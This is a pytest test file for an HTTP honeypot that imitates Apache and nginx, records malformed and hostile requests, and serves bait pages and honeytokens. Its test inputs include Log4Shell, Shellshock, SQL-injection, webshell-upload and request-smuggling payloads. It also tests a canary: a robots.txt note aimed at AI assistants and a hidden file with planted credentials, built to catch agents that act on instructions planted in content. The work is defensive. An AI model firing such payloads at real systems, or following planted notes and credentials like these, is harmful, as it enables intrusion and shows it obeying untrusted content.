"""The web decoy records what it used to drop, and answers as the server it
claims to be.

Driven over a socket. Identity seeds are fixed so each test knows which
server the decoy is claiming: seed 4 is Apache with PHP, seed 2 nginx with
PHP, seed 1 nginx without.
"""

import asyncio
import hashlib
import re
import time

import httpx
import pytest

from honeypot.core import canary, honeytokens
from honeypot.core.config import HoneypotConfig, config
from honeypot.core.identity import get_identity, reset_identity
from honeypot.core.session import session_manager
from honeypot.emulators import ai_canary
from honeypot.emulators.http import HTTPHoneypot

APACHE, NGINX_PHP, NGINX = 4, 2, 1


@pytest.fixture
async def decoy(tmp_path, monkeypatch):
    """Start decoys on free ports: ``await start(seed, **config)``."""
    monkeypatch.setattr(config, "bind_address", "127.0.0.1")
    monkeypatch.setattr(config, "enable_anti_fingerprinting", False)
    monkeypatch.setattr(config, "session_capture_dir", str(tmp_path / "sessions"))
    monkeypatch.setattr(config, "file_capture_dir", str(tmp_path / "uploads"))
    monkeypatch.setattr(config, "http_upstream", "")
    monkeypatch.setattr(config, "http_decoy_upstream", "")
    ingested: asyncio.Queue = asyncio.Queue()

    async def capture_ingest(session):
        await ingested.put(session.to_backend_payload())

    monkeypatch.setattr(session_manager, "_send_to_backend", capture_ingest)
    running = []

    async def start(seed, **settings):
        # The identity lives beside the captures, so a second decoy in one
        # test gets its own directory, and with it its own identity.
        monkeypatch.setattr(config, "session_capture_dir", str(tmp_path / f"sessions-{len(running)}"))
        monkeypatch.setenv("HONEYPOT_IDENTITY_SEED", str(seed))
        reset_identity()
        for name, value in settings.items():
            monkeypatch.setattr(config, name, value)
        honeypot = HTTPHoneypot(use_tls=False)
        honeypot.port = 0
        await honeypot.start()
        running.append(honeypot)
        return honeypot._server.sockets[0].getsockname()[1]

    start.running = running
    yield start, ingested
    for honeypot in running:
        await honeypot.stop()
    reset_identity()


async def _raw(port: int, data: bytes, timeout: float = 10) -> bytes:
    """Send bytes, read until the server closes."""
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    writer.write(data)
    await writer.drain()
    try:
        return await asyncio.wait_for(reader.read(), timeout=timeout)
    finally:
        writer.close()


def _request(method: str, target: str, *headers: str, body: bytes = b"", close: bool = True) -> bytes:
    lines = [f"{method} {target} HTTP/1.1", "Host: example.com", *headers]
    if body:
        lines.append(f"Content-Length: {len(body)}")
    if close:
        lines.append("Connection: close")
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


def _parse(response: bytes):
    """(status line, [header names], {lower name: value}, body)."""
    head, _, body = response.partition(b"\r\n\r\n")
    lines = head.decode("latin-1").split("\r\n")
    pairs = [line.partition(":") for line in lines[1:]]
    names = [name for name, _, _ in pairs]
    return lines[0], names, {name.lower(): value.strip() for name, _, value in pairs}, body


def _events(payload: dict, kind: str) -> list[dict]:
    return [e for e in payload["events"] if e["event_type"] == kind]


async def _next(ingested: asyncio.Queue) -> dict:
    return await asyncio.wait_for(ingested.get(), timeout=10)


# -- requests that used to leave no record -------------------------------------

async def test_an_overlong_request_line_is_answered_and_recorded(decoy):
    start, ingested = decoy
    port = await start(APACHE)
    response = await _raw(port, b"GET /" + b"A" * 9000 + b" HTTP/1.1\r\nHost: example.com\r\n\r\n")
    assert response.startswith(b"HTTP/1.1 414 Request-URI Too Long\r\n")

    payload = await _next(ingested)
    [refused] = _events(payload, "connection_refused")
    assert (refused["reason"], refused["count"], refused["status"]) == ("request_line_too_long", 1, 414)
    [entry] = payload["transcript"]
    assert entry["command"].startswith("GET /AAAA")
    # The megabyte that made it a refusal is not what gets kept.
    assert len(entry["command"]) <= 600
    assert entry["output"] == "HTTP/1.1 414 Request-URI Too Long  [refused: request_line_too_long]"


async def test_a_line_past_the_stream_limit_is_still_answered_and_recorded(decoy):
    start, ingested = decoy
    port = await start(NGINX)
    # No line end within asyncio's 64 KiB: readline() used to raise and the
    # connection closed without a reply or a session.
    response = await _raw(port, b"GET /" + b"B" * 70_000)
    assert response.startswith(b"HTTP/1.1 414 Request-URI Too Large\r\n")
    payload = await _next(ingested)
    assert _events(payload, "connection_refused")[0]["reason"] == "request_line_too_long"
    assert payload["transcript"][0]["command"].startswith("GET /BBBB")


async def test_an_oversized_body_is_refused_and_recorded_with_its_headers(decoy):
    start, ingested = decoy
    port = await start(APACHE)
    response = await _raw(port, (
        b"POST /upload HTTP/1.1\r\nHost: example.com\r\nUser-Agent: probe/1.0\r\n"
        b"Content-Length: 99999999999\r\n\r\n"
    ))
    assert response.startswith(b"HTTP/1.1 413 Request Entity Too Large\r\n")
    payload = await _next(ingested)
    assert _events(payload, "connection_refused")[0]["reason"] == "body_too_large"
    [entry] = payload["transcript"]
    assert entry["command"] == "POST /upload  [ua: probe/1.0]"
    assert entry["headers"]["content-length"] == "99999999999"


async def test_repeated_refusals_raise_one_events_count(decoy):
    start, ingested = decoy
    port = await start(APACHE, http_session_idle=0.5)
    for _ in range(3):
        await _raw(port, b"GET /" + b"A" * 9000 + b" HTTP/1.1\r\nHost: example.com\r\n\r\n")
    payload = await _next(ingested)
    [refused] = _events(payload, "connection_refused")
    assert refused["count"] == 3


async def test_a_target_urlparse_cannot_read_is_recorded(decoy):
    start, ingested = decoy
    port = await start(APACHE)
    # urlparse("//[") raises ValueError; the request used to vanish with it.
    response = await _raw(port, _request("GET", "//["))
    assert response.startswith(b"HTTP/1.1 404 ")
    payload = await _next(ingested)
    assert payload["transcript"][0]["command"] == "GET //["


async def test_a_chunked_body_is_decoded_into_one_request(decoy):
    start, ingested = decoy
    port = await start(APACHE)
    response = await _raw(port, (
        b"POST /search HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n"
        b"5\r\nid=1 \r\n1d;ext=1\r\nUNION SELECT user,pass FROM t\r\n0\r\nX-Trailer: 1\r\n\r\n"
    ))
    assert response.count(b"HTTP/1.1 ") == 1
    payload = await _next(ingested)
    # One request, with its body. Each chunk-size line used to be read as a
    # request line of its own and answered with a 400.
    [entry] = payload["transcript"]
    assert entry["command"] == "POST /search\nid=1 UNION SELECT user,pass FROM t"
    assert "attack_detected" in [p["type"] for p in payload["packets"]]


async def test_a_chunked_upload_is_captured_whole(decoy):
    start, ingested = decoy
    port = await start(APACHE)
    jsp = b'<%@ page import="java.io.*" %><% out.println("x"); %>'
    chunks = b"".join(b"%x\r\n%s\r\n" % (len(jsp[i:i + 7]), jsp[i:i + 7]) for i in range(0, len(jsp), 7))
    await _raw(port, (
        b"PUT /manager/cmd.jsp HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n" + chunks + b"0\r\n\r\n"
    ))
    payload = await _next(ingested)
    assert payload["uploads"][0]["sha256"] == hashlib.sha256(jsp).hexdigest()


async def test_a_chunked_body_is_held_to_the_body_limit(decoy, monkeypatch):
    start, ingested = decoy
    port = await start(NGINX)
    monkeypatch.setattr(HTTPHoneypot, "MAX_BODY_BYTES", 64)
    response = await _raw(port, (
        b"POST /upload HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\n\r\n"
        b"40\r\n" + b"a" * 64 + b"\r\n40\r\n" + b"b" * 64 + b"\r\n0\r\n\r\n"
    ))
    assert response.startswith(b"HTTP/1.1 413 ")
    assert _events(await _next(ingested), "connection_refused")[0]["reason"] == "body_too_large"


async def test_malformed_chunking_is_refused_not_misread(decoy):
    start, ingested = decoy
    port = await start(APACHE)
    response = await _raw(port, (
        b"POST /x HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\n\r\n"
        b"zz\r\nGET /smuggled HTTP/1.1\r\n\r\n"
    ))
    assert response.startswith(b"HTTP/1.1 400 ")
    payload = await _next(ingested)
    assert _events(payload, "connection_refused")[0]["reason"] == "bad_chunked_body"
    assert not any("smuggled" in t["command"] for t in payload["transcript"])


async def test_deeply_nested_json_does_not_lose_the_request(decoy):
    start, ingested = decoy
    port = await start(APACHE)
    # json.loads raises RecursionError on this, which is not a ValueError.
    body = b"[" * 20_000
    await _raw(port, _request("POST", "/login", "Content-Type: application/json", body=body))
    payload = await _next(ingested)
    assert payload["transcript"][0]["command"].startswith("POST /login")


# -- headers --------------------------------------------------------------------

async def test_headers_are_kept_in_order_and_an_attack_in_one_is_seen(decoy):
    start, ingested = decoy
    port = await start(APACHE)
    await _raw(port, _request(
        "GET", "/",
        "User-Agent: Mozilla/5.0",
        "X-Api-Version: ${jndi:ldap://203.0.113.9/a}",
        "Referer: () { :;}; /bin/id",
        "Authorization: Basic dG9tY2F0OnMzY3JldA==",
    ))
    payload = await _next(ingested)
    headers = payload["transcript"][0]["headers"]
    assert list(headers) == ["host", "user-agent", "x-api-version", "referer", "authorization", "connection"]
    assert headers["x-api-version"] == "${jndi:ldap://203.0.113.9/a}"
    # The password is in the credentials, which are restricted; the
    # transcript is not.
    assert headers["authorization"] == "Basic ********"
    assert payload["credentials"][0]["password"] == "s3cret"
    assert "attack_detected" in [p["type"] for p in payload["packets"]]
    assert payload["fingerprints"]["http_header_order"] == (
        "host,user-agent,x-api-version,referer,authorization,connection"
    )


async def test_transcript_headers_are_bounded(decoy):
    start, ingested = decoy
    port = await start(NGINX)
    many = [f"X-H{n}: v{n}" for n in range(60)]
    await _raw(port, _request("GET", "/", "X-Long: " + "a" * 3000, *many))
    payload = await _next(ingested)
    headers = payload["transcript"][0]["headers"]
    assert len(headers) == 40
    assert len(headers["x-long"]) == 512
    assert list(headers)[:3] == ["host", "x-long", "x-h0"]


async def test_too_many_headers_are_refused_not_read_as_requests(decoy):
    start, ingested = decoy
    port = await start(APACHE)
    many = [f"X-H{n}: {n}" for n in range(150)]
    response = await _raw(port, _request("GET", "/", *many))
    # The hundred-and-first header used to stay in the stream and be parsed
    # as the next request line.
    assert response.startswith(b"HTTP/1.1 400 Bad Request\r\n")
    assert response.count(b"HTTP/1.1 ") == 1
    assert _events(await _next(ingested), "connection_refused")[0]["reason"] == "too_many_headers"


# -- flow across a coalesced session --------------------------------------------

async def test_a_coalesced_sessions_flow_covers_every_connection_but_not_the_wait(decoy):
    start, ingested = decoy
    port = await start(APACHE, http_session_idle=0.8)
    first_request = _request("GET", "/robots.txt")
    second_request = _request("GET", "/.env", "X-Pad: " + "p" * 300)
    first = await _raw(port, first_request)
    await asyncio.sleep(0.1)
    second = await _raw(port, second_request)

    flow = (await _next(ingested))["flow"]
    # Only the first connection's bytes were counted before.
    assert flow["fwd_bytes"] == len(first_request) + len(second_request)
    assert flow["bwd_bytes"] == len(first) + len(second)
    assert flow["fwd_packets"] == 2
    # The session was delivered 0.8 s after the last request; that wait is
    # the engine's, not the client's, and used to be both of these.
    assert flow["duration"] < 0.6
    assert flow["flow_iat_max"] < 0.6


# -- jitter and banners ------------------------------------------------------------

def test_the_default_jitter_is_a_few_milliseconds():
    assert 0 < HoneypotConfig.response_delay_min <= HoneypotConfig.response_delay_max <= 0.02


async def test_turning_jitter_off_does_not_change_who_the_decoy_claims_to_be(decoy):
    start, _ = decoy
    port = await start(APACHE, enable_anti_fingerprinting=False)
    for path in ("/", "/admin", "/missing"):
        response = await _raw(port, _request("GET", path))
        _, _, headers, _ = _parse(response)
        assert headers["server"] == get_identity().http_server
        assert b"HoneySentinel" not in response


async def test_bait_pages_take_as_long_as_the_application_behind_the_decoy(decoy):
    start, _ = decoy
    port = await start(APACHE, enable_anti_fingerprinting=True)
    honeypot_delay = []

    async def timed(path):
        started = time.perf_counter()
        await _raw(port, _request("GET", path))
        honeypot_delay.append(time.perf_counter() - started)

    await timed("/.env")
    # As if an application behind the decoy had been answering in 150 ms.
    start.running[-1]._upstream_latency.append(0.15)
    await timed("/.env")
    assert honeypot_delay[0] < 0.1
    assert honeypot_delay[1] >= 0.15


# -- realism: methods, HEAD, connections ---------------------------------------------

@pytest.mark.parametrize("seed", [APACHE, NGINX_PHP])
@pytest.mark.parametrize("path", ["/robots.txt", "/admin", "/missing"])
async def test_head_is_get_without_the_body(decoy, seed, path):
    start, _ = decoy
    port = await start(seed)
    get_status, get_names, get_headers, get_body = _parse(await _raw(port, _request("GET", path)))
    head_status, head_names, head_headers, head_body = _parse(await _raw(port, _request("HEAD", path)))
    assert head_body == b""
    assert head_status == get_status
    # nginx sends a script's page chunked, and a HEAD has nothing to chunk.
    get_headers.pop("transfer-encoding", None)
    get_headers.pop("date"), head_headers.pop("date")
    assert head_headers == get_headers
    if "content-length" in get_headers:
        assert int(head_headers["content-length"]) == len(get_body)


async def test_apache_refuses_writes_the_way_apache_does(decoy):
    start, ingested = decoy
    port = await start(APACHE)
    post = await _raw(port, _request("POST", "/api/orders", body=b"{}"))
    put = await _raw(port, _request("PUT", "/shell.jsp", body=b"<% %>"))
    delete = await _raw(port, _request("DELETE", "/robots.txt"))
    options = await _raw(port, _request("OPTIONS", "/whatever"))
    unknown = await _raw(port, _request("FROB", "/"))

    assert post.startswith(b"HTTP/1.1 404 Not Found\r\n")
    for refused in (put, delete):
        status, _, headers, body = _parse(refused)
        assert status == "HTTP/1.1 405 Method Not Allowed"
        assert sorted(headers["allow"].split(",")) == ["GET", "HEAD", "OPTIONS", "POST"]
    assert b"<p>The requested method PUT is not allowed for this URL.</p>" in put
    status, _, headers, body = _parse(options)
    assert status == "HTTP/1.1 200 OK" and body == b"" and "allow" in headers
    assert unknown.startswith(b"HTTP/1.1 501 Not Implemented\r\n")
    # Refused, and still captured.
    payload = await _next(ingested)
    assert payload["uploads"][0]["source"] == "http_put"


async def test_nginx_refuses_writes_the_way_nginx_does(decoy):
    start, _ = decoy
    port = await start(NGINX)
    assert (await _raw(port, _request("POST", "/api/orders", body=b"{}"))).startswith(b"HTTP/1.1 404 Not Found\r\n")
    assert (await _raw(port, _request("PUT", "/shell.jsp", body=b"x"))).startswith(b"HTTP/1.1 404 Not Found\r\n")
    status, _, headers, _ = _parse(await _raw(port, _request("DELETE", "/robots.txt")))
    # nginx's 405 is "Not Allowed" and, unlike Apache's, lists nothing.
    assert status == "HTTP/1.1 405 Not Allowed"
    assert "allow" not in headers


async def test_connection_close_closes_and_its_absence_does_not(decoy):
    start, _ = decoy
    port = await start(APACHE)
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    try:
        for _ in range(2):
            # No Connection header: HTTP/1.1 keeps the connection, and
            # Apache says nothing about it. "Connection: close" used to go
            # out here while the socket stayed open.
            writer.write(_request("GET", "/robots.txt", close=False))
            await writer.drain()
            head = await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), timeout=5)
            _, _, headers, _ = _parse(head)
            assert "connection" not in headers
            await reader.readexactly(int(headers["content-length"]))
        writer.write(_request("GET", "/robots.txt"))
        await writer.drain()
        rest = await asyncio.wait_for(reader.read(), timeout=5)
        assert _parse(rest)[2]["connection"] == "close"
    finally:
        writer.close()


# -- realism: header order and stock pages ---------------------------------------------

async def test_apache_header_order_and_error_page(decoy):
    start, _ = decoy
    port = await start(APACHE)
    identity = get_identity()
    status, names, headers, body = _parse(await _raw(
        port, _request("GET", "/missing", "Connection: keep-alive", close=False), timeout=7
    ))
    assert names == ["Date", "Server", "Content-Length", "Keep-Alive", "Connection", "Content-Type"]
    assert headers["keep-alive"] == "timeout=5, max=100"
    assert headers["content-type"] == "text/html; charset=iso-8859-1"
    assert body.decode() == (
        '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n'
        "<html><head>\n<title>404 Not Found</title>\n</head><body>\n"
        "<h1>Not Found</h1>\n"
        "<p>The requested URL was not found on this server.</p>\n"
        "<hr>\n"
        f"<address>{identity.http_server} Server at example.com Port 80</address>\n"
        "</body></html>\n"
    )

    _, names, headers, _ = _parse(await _raw(port, _request("GET", "/robots.txt")))
    assert names == [
        "Date", "Server", "Last-Modified", "ETag", "Accept-Ranges",
        "Content-Length", "Vary", "Connection", "Content-Type",
    ]
    # A file is not a script's output.
    assert "x-powered-by" not in headers
    _, names, headers, _ = _parse(await _raw(port, _request("GET", "/admin")))
    assert names[:3] == ["Date", "Server", "X-Powered-By"] and names[-1] == "Content-Type"
    assert headers["x-powered-by"] == identity.php_version


async def test_nginx_header_order_and_error_page(decoy):
    start, _ = decoy
    port = await start(NGINX_PHP)
    server = get_identity().http_server
    status, names, headers, body = _parse(await _raw(port, _request("GET", "/missing")))
    assert names == ["Server", "Date", "Content-Type", "Content-Length", "Connection"]
    assert body.decode() == (
        "<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n"
        "<center><h1>404 Not Found</h1></center>\r\n"
        f"<hr><center>{server}</center>\r\n</body>\r\n</html>\r\n"
    )
    # 162 bytes is this release's well-known 404; 564 with the padding it
    # adds for browsers that would replace a short error page.
    assert len(body) == 162
    chrome = _parse(await _raw(port, _request("GET", "/missing", "User-Agent: Mozilla/5.0 Chrome/140.0")))
    assert len(chrome[3]) == 564

    _, names, headers, body = _parse(await _raw(port, _request("GET", "/")))
    assert names == [
        "Server", "Date", "Content-Type", "Content-Length", "Last-Modified",
        "Connection", "ETag", "Accept-Ranges",
    ]
    assert len(body) == 612  # the packaged welcome page
    _, names, headers, body = _parse(await _raw(port, _request("GET", "/admin")))
    assert names == ["Server", "Date", "Content-Type", "Transfer-Encoding", "Connection", "X-Powered-By"]
    assert body.endswith(b"\r\n0\r\n\r\n")


async def test_a_file_answers_conditional_requests(decoy):
    start, _ = decoy
    port = await start(NGINX)
    _, _, headers, _ = _parse(await _raw(port, _request("GET", "/robots.txt")))
    again = await _raw(port, _request("GET", "/robots.txt", f"If-None-Match: {headers['etag']}"))
    status, _, repeat, body = _parse(again)
    assert status == "HTTP/1.1 304 Not Modified" and body == b""
    assert repeat["etag"] == headers["etag"]


# -- constants that are no longer constant ------------------------------------------------

async def test_the_shell_bait_describes_this_host_and_never_says_honeypot(decoy):
    start, _ = decoy
    port = await start(APACHE)
    response = await _raw(port, _request("POST", "/shell", body=b"cmd=uname -a"))
    assert get_identity().uname_a.encode() in response
    assert b"honeypot" not in response.lower()


async def test_env_secrets_are_the_planted_ones_and_differ_per_deployment(decoy):
    start, _ = decoy
    port = await start(APACHE)
    first = _parse(await _raw(port, _request("GET", "/.env")))[3].decode()
    assert first == honeytokens.env_file_text()
    assert "supersecretpassword123" not in first
    other_port = await start(NGINX)
    second = _parse(await _raw(other_port, _request("GET", "/.env")))[3].decode()
    assert second == honeytokens.env_file_text() and second != first


async def test_a_login_sets_a_new_session_id_each_time_and_lands_on_a_real_page(decoy):
    start, ingested = decoy
    port = await start(APACHE)
    form = "Content-Type: application/x-www-form-urlencoded"
    cookies = []
    for _ in range(2):
        _, _, headers, _ = _parse(await _raw(port, _request("POST", "/login", form, body=b"username=a&password=b")))
        cookies.append(headers["set-cookie"])
        assert headers["location"] == "/admin/"
    assert all(re.fullmatch(r"PHPSESSID=[0-9a-v]{26}; path=/", c) for c in cookies)
    assert cookies[0] != cookies[1]
    assert (await _raw(port, _request("GET", "/admin/"))).startswith(b"HTTP/1.1 200 OK")
    assert len((await _next(ingested))["credentials"]) == 2


# -- the canary for automated agents --------------------------------------------------------

async def test_reading_robots_txt_is_not_the_canary_but_following_it_is(decoy):
    start, ingested = decoy
    port = await start(APACHE, http_session_idle=0.3)
    path = ai_canary.path(ai_canary.ROBOTS)
    robots = _parse(await _raw(port, _request("GET", "/robots.txt")))[3].decode()
    page = _parse(await _raw(port, _request("GET", "/admin")))[3].decode()
    token = canary.token(get_identity())
    # The file is described, never linked: its path appears nowhere a
    # crawler or a link extractor could lift it from.
    assert "AI assistants" in robots and token in robots and token in page
    assert path not in robots and path.lstrip("/") not in robots
    assert ai_canary.path(ai_canary.HTML_COMMENT).lstrip("/") not in page
    assert _events(await _next(ingested), "ai_canary_triggered") == []

    response = await _raw(port, _request("GET", path, "User-Agent: agent/1.0"))
    status, _, headers, body = _parse(response)
    assert status == "HTTP/1.1 200 OK" and headers["content-type"] == "text/plain"
    [hit] = _events(await _next(ingested), "ai_canary_triggered")
    assert hit["canary"] == token and hit["channel"] == "http"
    assert "robots.txt note" in hit["detail"] and "agent/1.0" in hit["detail"]


async def test_the_handover_file_plants_a_login_whose_use_is_recognised(decoy):
    start, ingested = decoy
    port = await start(APACHE)
    tokens = honeytokens.get_honeytokens()
    body = _parse(await _raw(port, _request("GET", ai_canary.path(ai_canary.HTML_COMMENT))))[3].decode()
    assert tokens.username in body and tokens.password in body
    await _next(ingested)

    login = f"username={tokens.username}&password={tokens.password}".encode()
    await _raw(port, _request(
        "POST", "/login", "Content-Type: application/x-www-form-urlencoded",
        "User-Agent: other", body=login,
    ))
    assert _events(await _next(ingested), "honeytoken_used")


async def test_the_canary_can_be_switched_off(decoy):
    start, ingested = decoy
    port = await start(NGINX, ai_canary=False)
    robots = _parse(await _raw(port, _request("GET", "/robots.txt")))[3].decode()
    assert "AI assistants" not in robots
    assert "<!--" not in _parse(await _raw(port, _request("GET", "/login")))[3].decode()
    response = await _raw(port, _request("GET", ai_canary.path(ai_canary.ROBOTS)))
    assert response.startswith(b"HTTP/1.1 404 ")
    assert _events(await _next(ingested), "ai_canary_triggered") == []


# -- an application behind the decoy ---------------------------------------------------------

HTML_PAGE = b"<html><body><h1>Shop</h1></body></html>"


async def _shop(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    request_line = (await reader.readline()).decode()
    while (await reader.readline()) not in (b"\r\n", b""):
        pass
    if " /api" in request_line:
        body, content_type = b'{"ok": true, "note": "</body>"}', "application/json"
    else:
        body, content_type = HTML_PAGE, "text/html; charset=utf-8"
    writer.write(
        f"HTTP/1.1 200 OK\r\nX-Powered-By: Express\r\nContent-Type: {content_type}\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n".encode() + body
    )
    await writer.drain()
    writer.close()


@pytest.fixture
async def shop():
    server = await asyncio.start_server(_shop, "127.0.0.1", 0)
    yield f"http://127.0.0.1:{server.sockets[0].getsockname()[1]}"
    server.close()
    await server.wait_closed()


@pytest.mark.parametrize("seed, leading", [(APACHE, ["Date", "Server"]), (NGINX, ["Server", "Date"])])
async def test_bait_and_application_pages_leave_through_the_same_front(decoy, shop, seed, leading):
    start, _ = decoy
    port = await start(seed, http_upstream=shop)
    _, app_names, app_headers, app_body = _parse(await _raw(port, _request("GET", "/")))
    _, bait_names, bait_headers, _ = _parse(await _raw(port, _request("GET", "/.env")))
    assert app_body == HTML_PAGE
    assert app_names[:2] == bait_names[:2] == leading
    assert app_headers["server"] == bait_headers["server"] == get_identity().http_server
    assert app_headers["connection"] == bait_headers["connection"] == "close"
    assert app_headers["x-powered-by"] == "Express"


async def test_application_pages_are_untouched_unless_the_upstream_canary_is_on(decoy, shop):
    start, _ = decoy
    port = await start(APACHE, http_upstream=shop)
    assert _parse(await _raw(port, _request("GET", "/")))[3] == HTML_PAGE

    planted_port = await start(APACHE, http_upstream=shop, http_ai_canary_upstream=True)
    _, _, headers, body = _parse(await _raw(planted_port, _request("GET", "/")))
    assert ai_canary.html_comment().encode() in body and body.endswith(b"</body></html>")
    assert int(headers["content-length"]) == len(body)
    # HTML only: a JSON answer that happens to contain "</body>" is left alone.
    api = _parse(await _raw(planted_port, _request("GET", "/api/items")))[3]
    assert api == b'{"ok": true, "note": "</body>"}'


async def test_httpx_reads_every_kind_of_answer(decoy):
    """A real client library against both servers' framing."""
    start, _ = decoy
    for seed in (APACHE, NGINX_PHP):
        port = await start(seed)
        async with httpx.AsyncClient(base_url=f"http://127.0.0.1:{port}") as client:
            page = await client.get("/wp-login.php")
            missing = await client.post("/nope", json={"a": 1})
            head = await client.head("/robots.txt")
        assert page.status_code == 200 and "loginform" in page.text
        assert missing.status_code == 404
        assert head.status_code == 200 and head.text == ""
